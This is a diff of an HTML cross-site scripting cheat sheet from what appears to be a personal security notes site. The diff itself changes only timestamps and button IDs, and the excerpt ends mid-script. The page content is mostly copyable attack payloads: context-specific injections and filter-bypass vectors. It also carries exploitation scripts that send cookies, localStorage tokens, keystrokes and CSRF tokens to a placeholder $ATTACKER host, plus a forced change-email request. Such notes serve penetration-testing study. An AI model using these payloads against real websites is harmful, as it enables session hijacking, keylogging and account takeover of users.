@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:13 -->
+<!-- 2026-07-30 Thu 22:23 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Cross-Site Scripting</title>
@@ -1003,11 +1003,11 @@ Related: <a href="20260213T071848==csrf--cross-site-request-forgery__cybersecuri
 <h3 id="orga907670">Injection Points</h3>
 <div class="outline-text-3" id="text-orga907670">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_484f03058e4f4cd4bdf9009c8ed2a719>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_b8124636a6a645499a08c4244c3da4ba>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_484f03058e4f4cd4bdf9009c8ed2a719=document.querySelector('button[name=btn_484f03058e4f4cd4bdf9009c8ed2a719]');
-copyBtnbtn_484f03058e4f4cd4bdf9009c8ed2a719.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`Test every input that appears in the response:\n- URL parameters: ?q=, ?name=, ?search=\n- Form fields: login, search, comment, profile fields\n- HTTP headers reflected in response: User-Agent, Referer, X-Forwarded-For\n- JSON/API response values rendered in the page\n- URL path segments: /user/<name>/profile\n`);copyBtnbtn_484f03058e4f4cd4bdf9009c8ed2a719.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_484f03058e4f4cd4bdf9009c8ed2a719.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b8124636a6a645499a08c4244c3da4ba=document.querySelector('button[name=btn_b8124636a6a645499a08c4244c3da4ba]');
+copyBtnbtn_b8124636a6a645499a08c4244c3da4ba.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`Test every input that appears in the response:\n- URL parameters: ?q=, ?name=, ?search=\n- Form fields: login, search, comment, profile fields\n- HTTP headers reflected in response: User-Agent, Referer, X-Forwarded-For\n- JSON/API response values rendered in the page\n- URL path segments: /user/<name>/profile\n`);copyBtnbtn_b8124636a6a645499a08c4244c3da4ba.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b8124636a6a645499a08c4244c3da4ba.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1030,11 +1030,11 @@ it appears in the response before injecting payloads:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ad8f58f5e3c243b98d2ef43ecceb1fc7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7494739a947e428aa569fd08a809c415>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ad8f58f5e3c243b98d2ef43ecceb1fc7=document.querySelector('button[name=btn_ad8f58f5e3c243b98d2ef43ecceb1fc7]');
-copyBtnbtn_ad8f58f5e3c243b98d2ef43ecceb1fc7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Probe string — check where it appears in the response\nxsstest1234\n\n# Then check the page source to identify the context:\n# - Between HTML tags: <p>xsstest1234</p>\n# - In an attribute: <input value=\"xsstest1234\">\n# - In a script block: var x = \"xsstest1234\";\n# - In a URL: href=\"xsstest1234\"\n`);copyBtnbtn_ad8f58f5e3c243b98d2ef43ecceb1fc7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ad8f58f5e3c243b98d2ef43ecceb1fc7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7494739a947e428aa569fd08a809c415=document.querySelector('button[name=btn_7494739a947e428aa569fd08a809c415]');
+copyBtnbtn_7494739a947e428aa569fd08a809c415.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Probe string — check where it appears in the response\nxsstest1234\n\n# Then check the page source to identify the context:\n# - Between HTML tags: <p>xsstest1234</p>\n# - In an attribute: <input value=\"xsstest1234\">\n# - In a script block: var x = \"xsstest1234\";\n# - In a URL: href=\"xsstest1234\"\n`);copyBtnbtn_7494739a947e428aa569fd08a809c415.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7494739a947e428aa569fd08a809c415.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1063,11 +1063,11 @@ The context determines which payload to use.
 <h3 id="org5508761">HTML Body Context</h3>
 <div class="outline-text-3" id="text-org5508761">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_c363f8d397764ca19876311ffdb9ac17>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_4659da6e57bc4192949b8c99325b941b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c363f8d397764ca19876311ffdb9ac17=document.querySelector('button[name=btn_c363f8d397764ca19876311ffdb9ac17]');
-copyBtnbtn_c363f8d397764ca19876311ffdb9ac17.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<script>alert(1)</script>\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<iframe src=\"javascript:alert(1)\">\n`);copyBtnbtn_c363f8d397764ca19876311ffdb9ac17.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c363f8d397764ca19876311ffdb9ac17.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4659da6e57bc4192949b8c99325b941b=document.querySelector('button[name=btn_4659da6e57bc4192949b8c99325b941b]');
+copyBtnbtn_4659da6e57bc4192949b8c99325b941b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>alert(1)</script>\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<iframe src=\"javascript:alert(1)\">\n`);copyBtnbtn_4659da6e57bc4192949b8c99325b941b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4659da6e57bc4192949b8c99325b941b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1085,11 +1085,11 @@ let res = copyTextToClipboard(`<script>alert(1)</script>\n<script>alert(document
 <h3 id="org351cbc1">HTML Attribute Context</h3>
 <div class="outline-text-3" id="text-org351cbc1">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_4b52c1eae5ea4e9fa08e7e56ecac27c4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_a81a0b55c8e04c049297f647ba846332>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4b52c1eae5ea4e9fa08e7e56ecac27c4=document.querySelector('button[name=btn_4b52c1eae5ea4e9fa08e7e56ecac27c4]');
-copyBtnbtn_4b52c1eae5ea4e9fa08e7e56ecac27c4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!-- Input: <input value=\"INJECT\"> -->\n\" onmouseover=\"alert(1)\n\" autofocus onfocus=\"alert(1)\n\"><script>alert(1)</script>\n\" onclick=\"alert(1)\" \"\n`);copyBtnbtn_4b52c1eae5ea4e9fa08e7e56ecac27c4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4b52c1eae5ea4e9fa08e7e56ecac27c4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a81a0b55c8e04c049297f647ba846332=document.querySelector('button[name=btn_a81a0b55c8e04c049297f647ba846332]');
+copyBtnbtn_a81a0b55c8e04c049297f647ba846332.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Input: <input value=\"INJECT\"> -->\n\" onmouseover=\"alert(1)\n\" autofocus onfocus=\"alert(1)\n\"><script>alert(1)</script>\n\" onclick=\"alert(1)\" \"\n`);copyBtnbtn_a81a0b55c8e04c049297f647ba846332.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a81a0b55c8e04c049297f647ba846332.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1106,11 +1106,11 @@ let res = copyTextToClipboard(`<!-- Input: <input value=\"INJECT\"> -->\n\" onmo
 <h3 id="org6d0ef1e">JavaScript String Context</h3>
 <div class="outline-text-3" id="text-org6d0ef1e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_34fa48c1e4d24ec2a4fa879a7999dd4f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_846b56aaa09f407a8142301371165548>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_34fa48c1e4d24ec2a4fa879a7999dd4f=document.querySelector('button[name=btn_34fa48c1e4d24ec2a4fa879a7999dd4f]');
-copyBtnbtn_34fa48c1e4d24ec2a4fa879a7999dd4f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`// Input: var x = \"INJECT\";\n\"-alert(1)-\"\n\";alert(1)//\n\\\";alert(1)//\n'+alert(1)+'\n`);copyBtnbtn_34fa48c1e4d24ec2a4fa879a7999dd4f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_34fa48c1e4d24ec2a4fa879a7999dd4f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_846b56aaa09f407a8142301371165548=document.querySelector('button[name=btn_846b56aaa09f407a8142301371165548]');
+copyBtnbtn_846b56aaa09f407a8142301371165548.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Input: var x = \"INJECT\";\n\"-alert(1)-\"\n\";alert(1)//\n\\\";alert(1)//\n'+alert(1)+'\n`);copyBtnbtn_846b56aaa09f407a8142301371165548.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_846b56aaa09f407a8142301371165548.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1127,11 +1127,11 @@ let res = copyTextToClipboard(`// Input: var x = \"INJECT\";\n\"-alert(1)-\"\n\"
 <h3 id="orgf00ca2b">JavaScript Template Literal Context</h3>
 <div class="outline-text-3" id="text-orgf00ca2b">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_09935a28e2e34ae9a494d37e2d63c9f9>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_ee17c73f9cd84c4c8047171201e75e3c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_09935a28e2e34ae9a494d37e2d63c9f9=document.querySelector('button[name=btn_09935a28e2e34ae9a494d37e2d63c9f9]');
-copyBtnbtn_09935a28e2e34ae9a494d37e2d63c9f9.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`// Input: var x = \`INJECT\`;\n${alert(1)}\n`);copyBtnbtn_09935a28e2e34ae9a494d37e2d63c9f9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_09935a28e2e34ae9a494d37e2d63c9f9.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ee17c73f9cd84c4c8047171201e75e3c=document.querySelector('button[name=btn_ee17c73f9cd84c4c8047171201e75e3c]');
+copyBtnbtn_ee17c73f9cd84c4c8047171201e75e3c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Input: var x = \`INJECT\`;\n${alert(1)}\n`);copyBtnbtn_ee17c73f9cd84c4c8047171201e75e3c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ee17c73f9cd84c4c8047171201e75e3c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1145,11 +1145,11 @@ let res = copyTextToClipboard(`// Input: var x = \`INJECT\`;\n${alert(1)}\n`);co
 <h3 id="org941f1e4">URL/href Context</h3>
 <div class="outline-text-3" id="text-org941f1e4">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_aa61e90ed7eb4dcb912dca01d2b7593e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_c64d702f7e8940168d0d0952c4a58ad2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_aa61e90ed7eb4dcb912dca01d2b7593e=document.querySelector('button[name=btn_aa61e90ed7eb4dcb912dca01d2b7593e]');
-copyBtnbtn_aa61e90ed7eb4dcb912dca01d2b7593e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!-- Input: <a href=\"INJECT\"> -->\njavascript:alert(1)\n`);copyBtnbtn_aa61e90ed7eb4dcb912dca01d2b7593e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aa61e90ed7eb4dcb912dca01d2b7593e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c64d702f7e8940168d0d0952c4a58ad2=document.querySelector('button[name=btn_c64d702f7e8940168d0d0952c4a58ad2]');
+copyBtnbtn_c64d702f7e8940168d0d0952c4a58ad2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Input: <a href=\"INJECT\"> -->\njavascript:alert(1)\n`);copyBtnbtn_c64d702f7e8940168d0d0952c4a58ad2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c64d702f7e8940168d0d0952c4a58ad2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1164,11 +1164,11 @@ javascript:alert(1)
 <h2 id="orgd9ad799">4. Filter Bypass Techniques</h2>
 <div class="outline-text-2" id="text-orgd9ad799">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_38f5fecca14a4b6fb88fdd5f739139d3>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_ca8bd667bbc84a75b18ea89aa304645b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_38f5fecca14a4b6fb88fdd5f739139d3=document.querySelector('button[name=btn_38f5fecca14a4b6fb88fdd5f739139d3]');
-copyBtnbtn_38f5fecca14a4b6fb88fdd5f739139d3.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!-- Case variation -->\n<ScRiPt>alert(1)</ScRiPt>\n<SCRIPT>alert(1)</SCRIPT>\n\n<!-- No quotes -->\n<img src=x onerror=alert(1)>\n\n<!-- No parentheses -->\n<img src=x onerror=alert\`1\`>\n\n<!-- HTML entities -->\n<img src=x onerror=&#97;lert(1)>\n<img src=x onerror=&#x61;lert(1)>\n\n<!-- Double encoding -->\n%253Cscript%253Ealert(1)%253C/script%253E\n\n<!-- Whitespace variations -->\n<img src=x    onerror   =   alert(1)>\n<img/src=x/onerror=alert(1)>\n\n<!-- Alternative event handlers -->\n<body onpageshow=alert(1)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<video src=x onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n\n<!-- Broken tag — some parsers repair it -->\n<scr<script>ipt>alert(1)</scr</script>ipt>\n\n<!-- SVG vectors -->\n<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1) attributeName=x>\n`);copyBtnbtn_38f5fecca14a4b6fb88fdd5f739139d3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_38f5fecca14a4b6fb88fdd5f739139d3.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ca8bd667bbc84a75b18ea89aa304645b=document.querySelector('button[name=btn_ca8bd667bbc84a75b18ea89aa304645b]');
+copyBtnbtn_ca8bd667bbc84a75b18ea89aa304645b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Case variation -->\n<ScRiPt>alert(1)</ScRiPt>\n<SCRIPT>alert(1)</SCRIPT>\n\n<!-- No quotes -->\n<img src=x onerror=alert(1)>\n\n<!-- No parentheses -->\n<img src=x onerror=alert\`1\`>\n\n<!-- HTML entities -->\n<img src=x onerror=&#97;lert(1)>\n<img src=x onerror=&#x61;lert(1)>\n\n<!-- Double encoding -->\n%253Cscript%253Ealert(1)%253C/script%253E\n\n<!-- Whitespace variations -->\n<img src=x    onerror   =   alert(1)>\n<img/src=x/onerror=alert(1)>\n\n<!-- Alternative event handlers -->\n<body onpageshow=alert(1)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<video src=x onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n\n<!-- Broken tag — some parsers repair it -->\n<scr<script>ipt>alert(1)</scr</script>ipt>\n\n<!-- SVG vectors -->\n<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1) attributeName=x>\n`);copyBtnbtn_ca8bd667bbc84a75b18ea89aa304645b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ca8bd667bbc84a75b18ea89aa304645b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1218,11 +1218,11 @@ let res = copyTextToClipboard(`<!-- Case variation -->\n<ScRiPt>alert(1)</ScRiPt
 <h3 id="org248eb78">Confirm the origin (cleaner proof than alert)</h3>
 <div class="outline-text-3" id="text-org248eb78">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_3bf5f4d4a75844f8a78d363f36292d08>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_7efaf2a0408a47b1b899da24d98aff31>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3bf5f4d4a75844f8a78d363f36292d08=document.querySelector('button[name=btn_3bf5f4d4a75844f8a78d363f36292d08]');
-copyBtnbtn_3bf5f4d4a75844f8a78d363f36292d08.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`alert(document.domain)\n`);copyBtnbtn_3bf5f4d4a75844f8a78d363f36292d08.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3bf5f4d4a75844f8a78d363f36292d08.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7efaf2a0408a47b1b899da24d98aff31=document.querySelector('button[name=btn_7efaf2a0408a47b1b899da24d98aff31]');
+copyBtnbtn_7efaf2a0408a47b1b899da24d98aff31.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`alert(document.domain)\n`);copyBtnbtn_7efaf2a0408a47b1b899da24d98aff31.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7efaf2a0408a47b1b899da24d98aff31.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1235,11 +1235,11 @@ let res = copyTextToClipboard(`alert(document.domain)\n`);copyBtnbtn_3bf5f4d4a75
 <h3 id="org11c7469">Cookie theft</h3>
 <div class="outline-text-3" id="text-org11c7469">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_9761f9b7d80e4e669634d757d950ee93>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_d44a8dfc582b473a98abdad9515f7869>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_9761f9b7d80e4e669634d757d950ee93=document.querySelector('button[name=btn_9761f9b7d80e4e669634d757d950ee93]');
-copyBtnbtn_9761f9b7d80e4e669634d757d950ee93.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`// Send cookie to attacker server\n<script>\nfetch('https://$ATTACKER/?c=' + document.cookie)\n</script>\n\n// Image tag alternative — no JS fetch needed\n<img src=x onerror=\"this.src='https://$ATTACKER/?c='+document.cookie\">\n`);copyBtnbtn_9761f9b7d80e4e669634d757d950ee93.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9761f9b7d80e4e669634d757d950ee93.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d44a8dfc582b473a98abdad9515f7869=document.querySelector('button[name=btn_d44a8dfc582b473a98abdad9515f7869]');
+copyBtnbtn_d44a8dfc582b473a98abdad9515f7869.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Send cookie to attacker server\n<script>\nfetch('https://$ATTACKER/?c=' + document.cookie)\n</script>\n\n// Image tag alternative — no JS fetch needed\n<img src=x onerror=\"this.src='https://$ATTACKER/?c='+document.cookie\">\n`);copyBtnbtn_d44a8dfc582b473a98abdad9515f7869.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d44a8dfc582b473a98abdad9515f7869.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1258,11 +1258,11 @@ fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);
 <h3 id="org936e520">Session token theft (localStorage)</h3>
 <div class="outline-text-3" id="text-org936e520">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_3aabae2290f24a9eba2f2dedcebe86c7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_fc8d98da8b3c4b039aaa1a9d021a7bea>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3aabae2290f24a9eba2f2dedcebe86c7=document.querySelector('button[name=btn_3aabae2290f24a9eba2f2dedcebe86c7]');
-copyBtnbtn_3aabae2290f24a9eba2f2dedcebe86c7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<script>\nfetch('https://$ATTACKER/?t=' + localStorage.getItem('token'))\n</script>\n`);copyBtnbtn_3aabae2290f24a9eba2f2dedcebe86c7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3aabae2290f24a9eba2f2dedcebe86c7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_fc8d98da8b3c4b039aaa1a9d021a7bea=document.querySelector('button[name=btn_fc8d98da8b3c4b039aaa1a9d021a7bea]');
+copyBtnbtn_fc8d98da8b3c4b039aaa1a9d021a7bea.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\nfetch('https://$ATTACKER/?t=' + localStorage.getItem('token'))\n</script>\n`);copyBtnbtn_fc8d98da8b3c4b039aaa1a9d021a7bea.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fc8d98da8b3c4b039aaa1a9d021a7bea.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1277,11 +1277,11 @@ fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);
 <h3 id="orgfd854f0">Keylogger</h3>
 <div class="outline-text-3" id="text-orgfd854f0">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_57acd26c327e41aeae313690663b926f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_e597e0b3c50840b4958ba2d3b9730c8e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_57acd26c327e41aeae313690663b926f=document.querySelector('button[name=btn_57acd26c327e41aeae313690663b926f]');
-copyBtnbtn_57acd26c327e41aeae313690663b926f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<script>\ndocument.onkeypress = function(e) {\n  fetch('https://$ATTACKER/?k=' + e.key);\n}\n</script>\n`);copyBtnbtn_57acd26c327e41aeae313690663b926f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_57acd26c327e41aeae313690663b926f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e597e0b3c50840b4958ba2d3b9730c8e=document.querySelector('button[name=btn_e597e0b3c50840b4958ba2d3b9730c8e]');
+copyBtnbtn_e597e0b3c50840b4958ba2d3b9730c8e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\ndocument.onkeypress = function(e) {\n  fetch('https://$ATTACKER/?k=' + e.key);\n}\n</script>\n`);copyBtnbtn_e597e0b3c50840b4958ba2d3b9730c8e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e597e0b3c50840b4958ba2d3b9730c8e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1298,11 +1298,11 @@ document.onkeypress = <span style="color: var(--clr-keyword); background-color: 
 <h3 id="orgfbf8b45">Forced request as victim (CSRF via XSS)</h3>
 <div class="outline-text-3" id="text-orgfbf8b45">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_59e0c1177c5847b485b89ca00e2ca346>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_359a6d7005d94e7f8457ef420bb5b160>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_59e0c1177c5847b485b89ca00e2ca346=document.querySelector('button[name=btn_59e0c1177c5847b485b89ca00e2ca346]');
-copyBtnbtn_59e0c1177c5847b485b89ca00e2ca346.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<script>\nfetch('https://target.com/account/change-email', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'email=attacker@evil.com'\n})\n</script>\n`);copyBtnbtn_59e0c1177c5847b485b89ca00e2ca346.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_59e0c1177c5847b485b89ca00e2ca346.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_359a6d7005d94e7f8457ef420bb5b160=document.querySelector('button[name=btn_359a6d7005d94e7f8457ef420bb5b160]');
+copyBtnbtn_359a6d7005d94e7f8457ef420bb5b160.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\nfetch('https://target.com/account/change-email', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'email=attacker@evil.com'\n})\n</script>\n`);copyBtnbtn_359a6d7005d94e7f8457ef420bb5b160.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_359a6d7005d94e7f8457ef420bb5b160.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1322,11 +1322,11 @@ fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);
 <h3 id="orgabdca2e">Capture and exfiltrate CSRF token</h3>
 <div class="outline-text-3" id="text-orgabdca2e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_a54f4c7e76274bb28485d81b976c6d66>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_991ab9ac852444f481e7785e721dff60>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a54f4c7e76274bb28485d81b976c6d66=document.querySelector('button[name=btn_a54f4c7e76274bb28485d81b976c6d66]');
-copyBtnbtn_a54f4c7e76274bb28485d81b976c6d66.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<script>\nfetch('/account/settings')\n  .then(r => r.text())\n  .then(html => {\n    const token = html.match(/csrf_token.*?value=\"([^\"]+)\"/)[1];\n    fetch('https://$ATTACKER/?token=' + token);\n  })\n</script>\n`);copyBtnbtn_a54f4c7e76274bb28485d81b976c6d66.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a54f4c7e76274bb28485d81b976c6d66.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_991ab9ac852444f481e7785e721dff60=document.querySelector('button[name=btn_991ab9ac852444f481e7785e721dff60]');
+copyBtnbtn_991ab9ac852444f481e7785e721dff60.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\nfetch('/account/settings')\n  .then(r => r.text())\n  .then(html => {\n    const token = html.match(/csrf_token.*?value=\"([^\"]+)\"/)[1];\n    fetch('https://$ATTACKER/?token=' + token);\n  })\n</script>\n`);copyBtnbtn_991ab9ac852444f481e7785e721dff60.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_991ab9ac852444f481e7785e721dff60.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1355,11 +1355,11 @@ source and writes to a sink without sanitisation.
 <h3 id="orga6b892c">Common Sources (attacker-controlled input)</h3>
 <div class="outline-text-3" id="text-orga6b892c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_a4c93cb083014ebfa432148ee6bcea83>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_f2b0d625262c47e795c1362782f3edbf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a4c93cb083014ebfa432148ee6bcea83=document.querySelector('button[name=btn_a4c93cb083014ebfa432148ee6bcea83]');
-copyBtnbtn_a4c93cb083014ebfa432148ee6bcea83.addEventListener('click', function(event) {
